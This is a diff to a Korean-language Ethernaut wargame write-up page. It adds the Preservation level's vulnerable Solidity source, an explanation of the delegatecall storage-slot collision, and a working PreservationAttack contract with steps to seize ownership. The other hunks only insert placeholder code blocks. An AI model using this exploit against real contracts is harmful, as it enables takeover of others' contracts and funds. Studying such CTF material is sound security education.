@@ -29,7 +29,9 @@ Ethernaut 사용법과 콘솔 상호작용을 익히는 튜토리얼.
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1671,7 +1673,7 @@ await contract.balanceOf(player);
 
 ### 문제 요약
 
-작성 예정.
+`owner`를 내 주소로 바꾸면 클리어된다. `delegatecall` 때문에 라이브러리의 `storedTime` 변경이 실제로는 `Preservation`의 slot 0을 덮어쓴다.
 
 ### 핵심
 
@@ -1681,21 +1683,138 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
 
 ### 풀이
 
-작성 예정.
+핵심은 `delegatecall`과 스토리지 레이아웃 차이다.
+
+`Preservation`의 스토리지는 다음 순서다.
+
+- slot 0: `timeZone1Library`
+- slot 1: `timeZone2Library`
+- slot 2: `owner`
+- slot 3: `storedTime`
+
+반면 `LibraryContract`는 변수 하나만 있다.
+
+```solidity
+uint256 storedTime;
+```
+
+즉 `LibraryContract` 기준 `storedTime`은 slot 0이다.
+
+`setFirstTime()`은 `timeZone1Library`를 대상으로 `delegatecall`을 한다.
+
+```solidity
+timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+```
+
+`delegatecall`은 대상 컨트랙트의 코드만 실행하고, 스토리지는 호출한 컨트랙트의 스토리지를 사용한다. 그래서 `LibraryContract.setTime()`의 다음 코드가 실행되면:
+
+```solidity
+storedTime = _time;
+```
+
+실제로는 `Preservation`의 slot 0, 즉 `timeZone1Library`가 `_time` 값으로 바뀐다.
+
+공격 순서는 두 단계다.
+
+1. `setFirstTime(uint256(uint160(공격컨트랙트주소)))`를 호출해 `timeZone1Library`를 공격 컨트랙트 주소로 바꾼다.
+2. 다시 `setFirstTime(...)`을 호출하면 이제 공격 컨트랙트가 `delegatecall` 대상이 된다. 공격 컨트랙트의 `setTime()`에서 slot 2에 있는 `owner`를 바꾼다.
+
+공격 컨트랙트는 `Preservation`과 같은 슬롯 배치를 맞춰야 한다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IPreservation {
+    function setFirstTime(uint256 _timeStamp) external;
+}
+
+contract PreservationAttack {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    IPreservation private immutable target;
+
+    constructor(address targetAddress) {
+        target = IPreservation(targetAddress);
+    }
+
+    function attack() external {
+        target.setFirstTime(uint256(uint160(address(this))));
+        target.setFirstTime(uint256(uint160(msg.sender)));
+    }
+
+    function setTime(uint256 _owner) public {
+        owner = address(uint160(_owner));
+    }
+}
 ```
+
+Remix에서 `PreservationAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.
+
+```javascript
+contract.address
+```
+
+배포 후 `attack()`을 실행하고 확인한다.
+
+```javascript
+await contract.owner()
+```
+
+내 지갑 주소가 나오면 인스턴스를 제출하면 된다.
 
 ### 정리
 
-작성 예정.
+`delegatecall`을 사용할 때는 호출 대상 코드와 현재 컨트랙트의 스토리지 레이아웃이 맞아야 한다. 
+
+라이브러리 주소를 외부 입력으로 덮을 수 있으면, 이후 임의 코드 실행으로 소유권까지 탈취할 수 있다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Recovery" markdown="1">
@@ -1714,7 +1833,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1747,7 +1868,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1780,7 +1903,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1813,7 +1938,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1846,7 +1973,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1879,7 +2008,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1912,7 +2043,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1945,7 +2078,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -1978,7 +2113,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2011,7 +2148,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2044,7 +2183,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2077,7 +2218,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2110,7 +2253,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2143,7 +2288,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2176,7 +2323,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2209,7 +2358,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2240,7 +2391,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2271,7 +2424,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2302,7 +2457,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2333,7 +2490,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2364,7 +2523,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2395,7 +2556,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2426,7 +2589,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
@@ -2457,7 +2622,9 @@ await contract.balanceOf(player);
 
 ### 소스코드
 
-작성 예정.
+```solidity
+// 작성 예정
+```
 
 ### 풀이
 
